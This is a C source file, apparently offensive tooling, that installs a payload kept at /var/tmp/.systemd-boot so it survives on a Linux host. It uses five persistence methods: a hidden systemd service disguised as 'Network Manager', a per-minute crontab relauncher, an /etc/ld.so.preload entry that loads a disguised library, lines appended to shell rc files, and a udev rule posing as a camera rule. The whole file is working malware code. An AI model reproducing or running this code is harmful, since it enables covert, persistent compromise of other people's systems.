/*
 * Linux Persistence Module
 *
 * 实现多种持久化机制：
 * 1. systemd service
 * 2. crontab
 * 3. LD_PRELOAD
 * 4. bashrc/zshrc
 * 5. udev rule
 *
 * 编译: gcc -O2 -Wall -s linux_persist.c -o persistence
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pwd.h>
#include <errno.h>

#define PAYLOAD_PATH "/var/tmp/.systemd-boot"
#define SUCCESS 1
#define FAILURE 0

/*
 * 方法1: systemd service
 */
int install_systemd_service() {
    const char* service_content =
        "[Unit]\n"
        "Description=Network Manager\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=" PAYLOAD_PATH "\n"
        "Restart=always\n"
        "RestartSec=30\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    const char* service_path = "/etc/systemd/system/.systemd-networkd.service";

    int fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return FAILURE;

    write(fd, service_content, strlen(service_content));
    close(fd);

    // systemctl daemon-reload && enable
    system("systemctl daemon-reload >/dev/null 2>&1");
    system("systemctl enable .systemd-networkd.service >/dev/null 2>&1");
    system("systemctl start .systemd-networkd.service >/dev/null 2>&1");

    return SUCCESS;
}

/*
 * 方法2: crontab
 */
int install_crontab() {
    char cmd[512];
    char cron_line[256];

    // 检查是否已存在
    snprintf(cmd, sizeof(cmd),
             "crontab -l 2>/dev/null | grep -c '%s' || true",
             PAYLOAD_PATH);

    FILE* fp = popen(cmd, "r");
    if (fp) {
        char buf[64];
        fgets(buf, sizeof(buf), fp);
        pclose(fp);
        if (atoi(buf) > 0) {
            return SUCCESS;  // 已存在
        }
    }

    // 添加 cron 任务
    snprintf(cron_line, sizeof(cron_line),
             "* * * * * pgrep -x systemd-boot || %s >/dev/null 2>&1",
             PAYLOAD_PATH);

    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo '%s') | crontab -",
             cron_line);

    int ret = system(cmd);
    return (ret == 0) ? SUCCESS : FAILURE;
}

/*
 * 方法3: LD_PRELOAD
 */
int install_ld_preload() {
    const char* preload_path = "/etc/ld.so.preload";
    const char* lib_path = "/var/tmp/.libselinux.so";

    // 复制 payload 为 .so
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "cp %s %s", PAYLOAD_PATH, lib_path);
    system(cmd);

    // 写入 ld.so.preload
    int fd = open(preload_path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return FAILURE;

    write(fd, lib_path, strlen(lib_path));
    write(fd, "\n", 1);
    close(fd);

    return SUCCESS;
}

/*
 * 方法4: shell rc files
 */
int install_shell_rc() {
    int success = 0;
    struct passwd* pw = getpwuid(getuid());
    if (!pw) return FAILURE;

    const char* rc_files[] = {
        "/etc/bash.bashrc",
        "/etc/zsh/zshrc",
        "/etc/profile",
        "/etc/zshrc"
    };

    const char* line = PAYLOAD_PATH " &\n";

    for (int i = 0; i < 4; i++) {
        int fd = open(rc_files[i], O_WRONLY | O_APPEND);
        if (fd >= 0) {
            write(fd, line, strlen(line));
            close(fd);
            success++;
        }
    }

    // 用户级 rc 文件
    char user_rc[512];
    snprintf(user_rc, sizeof(user_rc), "%s/.bashrc", pw->pw_dir);
    int fd = open(user_rc, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd >= 0) {
        write(fd, line, strlen(line));
        close(fd);
        success++;
    }

    return success;
}

/*
 * 方法5: udev rule
 */
int install_udev_rule() {
    const char* rule =
        "ACTION==\"add\", KERNEL==\"video[0-9]*\", RUN+=\"" PAYLOAD_PATH "\"\n";

    const char* rule_path = "/etc/udev/rules.d/99-camera.rules";
    int fd = open(rule_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return FAILURE;

    write(fd, rule, strlen(rule));
    close(fd);

    system("udevadm control --reload-rules >/dev/null 2>&1");
    return SUCCESS;
}

int main(int argc, char* argv[]) {
    int count = 0;

    printf("=== Installing Linux Persistence ===\n\n");

    printf("[*] Installing systemd service...\n");
    if (install_systemd_service()) {
        printf("    [+] systemd service installed\n");
        count++;
    }

    printf("[*] Installing crontab...\n");
    if (install_crontab()) {
        printf("    [+] crontab installed\n");
        count++;
    }

    printf("[*] Installing LD_PRELOAD...\n");
    if (getuid() == 0 && install_ld_preload()) {
        printf("    [+] LD_PRELOAD installed\n");
        count++;
    }

    printf("[*] Installing shell rc files...\n");
    int rc = install_shell_rc();
    printf("    [+] %d rc files modified\n", rc);
    count += (rc > 0) ? 1 : 0;

    printf("[*] Installing udev rule...\n");
    if (getuid() == 0 && install_udev_rule()) {
        printf("    [+] udev rule installed\n");
        count++;
    }

    printf("\n[+] Total persistence mechanisms: %d\n", count);
    return 0;
}
